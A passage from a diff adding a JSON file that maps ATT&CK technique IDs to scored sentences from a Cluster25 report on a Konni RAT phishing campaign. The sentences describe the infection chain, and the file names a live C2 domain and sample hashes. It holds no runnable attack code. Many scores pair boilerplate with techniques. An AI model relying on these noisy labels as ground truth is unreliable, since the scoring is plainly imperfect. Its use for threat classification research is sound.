+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.4924
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.3179
+      },
+      {
+        "sentence": "Visit us at cluster25.io IMPORTANT NOTICE: ©2021 Cluster25.",
+        "score": 0.3241
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.3572
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.3117
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.3502
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.3297
+      }
+    ],
+    "T1204": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.6544
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.4331
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.3873
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.4672
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.5533
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.386
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.3783
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.4973
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.3349
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.3455
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.3349
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.3298
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.3168
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.3228
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.4266
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.3129
+      },
+      {
+        "sentence": "Visit us at cluster25.io IMPORTANT NOTICE: ©2021 Cluster25.",
+        "score": 0.3165
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.3844
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.4129
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.3759
+      },
+      {
+        "sentence": "The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. ---------------------------------------- Conversion note: Status: ok",
+        "score": 0.4032
+      }
+    ],
+    "T1543": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.4098
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.408
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.6231
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.3408
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.3575
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.4183
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.4709
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.4415
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.4171
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.4863
+      },
+      {
+        "sentence": "The Windows service is installed by configuring svchost.exe as a process container of the DLL executable representing Konni RAT malware.",
+        "score": 0.5898
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.3845
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.4914
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.3513
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.4398
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.3594
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.416
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.5788
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.3487
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.3682
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.356
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.3463
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.314
+      }
+    ],
+    "T1560": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.3457
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.4219
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.3907
+      },
+      {
+        "sentence": "02 INITIAL ACCESS C25 has traced an activity that started at least from August 2021 aimed at Russian targets operating in the diplomatic sector.",
+        "score": 0.3542
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.3642
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.4438
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.5155
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.4614
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.4053
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.4737
+      },
+      {
+        "sentence": "The Command-and- Control Apache webserver response was configured to respond with HTTP status code 401, having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks), returning as a response, in any case, a compressed CAB file encoded in base64 visible in the evidence below.",
+        "score": 0.4555
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.5549
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.4302
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.3396
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.5662
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.6221
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.3881
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.4276
+      },
+      {
+        "sentence": "05 ATTRIBUTION Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni.",
+        "score": 0.3216
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.572
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.4293
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.3632
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.3545
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.3785
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.344
+      },
+      {
+        "sentence": "Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.",
+        "score": 0.4495
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.4359
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.4697
+      },
+      {
+        "sentence": "All rights reserved.",
+        "score": 0.3168
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.4201
+      },
+      {
+        "sentence": "Traffic Light Protocol (TLP) violation could lead to the immediate cancellation of existing services as well as the initiation of legal actions aimed at protecting the intellectual property and competitive advantage of DuskRise Inc.",
+        "score": 0.328
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.5331
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.3789
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.464
+      },
+      {
+        "sentence": "The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. ---------------------------------------- Conversion note: Status: ok",
+        "score": 0.3652
+      }
+    ],
+    "T1566": [
+      {
+        "sentence": "Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload.",
+        "score": 0.6669
+      },
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.4328
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.5065
+      },
+      {
+        "sentence": "02 INITIAL ACCESS C25 has traced an activity that started at least from August 2021 aimed at Russian targets operating in the diplomatic sector.",
+        "score": 0.3927
+      },
+      {
+        "sentence": "2022 // © Cluster25 5 Unrestricted // freely shareable content TLP:WHITE On December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.",
+        "score": 0.7082
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.661
+      },
+      {
+        "sentence": "The emails were spoofed using a *@mid.ru account as a sender to pretend that it was sent from the Russian Embassy in Serbia.",
+        "score": 0.6746
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.4108
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.4765
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.3359
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.3094
+      },
+      {
+        "sentence": "The Command-and- Control Apache webserver response was configured to respond with HTTP status code 401, having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks), returning as a response, in any case, a compressed CAB file encoded in base64 visible in the evidence below.",
+        "score": 0.3442
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.3033
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.3561
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.3988
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.3075
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.3202
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.3349
+      },
+      {
+        "sentence": "05 ATTRIBUTION Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni.",
+        "score": 0.3898
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.3826
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.3848
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.5017
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.3413
+      },
+      {
+        "sentence": "Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.",
+        "score": 0.4171
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.4533
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.4013
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.3951
+      },
+      {
+        "sentence": "Traffic Light Protocol (TLP) violation could lead to the immediate cancellation of existing services as well as the initiation of legal actions aimed at protecting the intellectual property and competitive advantage of DuskRise Inc.",
+        "score": 0.3694
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.3809
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.3936
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.4042
+      },
+      {
+        "sentence": "The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. ---------------------------------------- Conversion note: Status: ok",
+        "score": 0.3847
+      }
+    ],
+    "T1057": [
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.3386
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.3361
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.3269
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.3909
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.4069
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.3214
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.3079
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.306
+      }
+    ],
+    "T1082": [
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.3632
+      },
+      {
+        "sentence": "Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection.",
+        "score": 0.3066
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.4151
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.374
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.4867
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.3086
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.5383
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.3
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.4008
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.4099
+      },
+      {
+        "sentence": "05 ATTRIBUTION Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni.",
+        "score": 0.3052
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.4492
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.376
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.3438
+      },
+      {
+        "sentence": "Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.",
+        "score": 0.3319
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.3297
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.4012
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.3487
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.3031
+      },
+      {
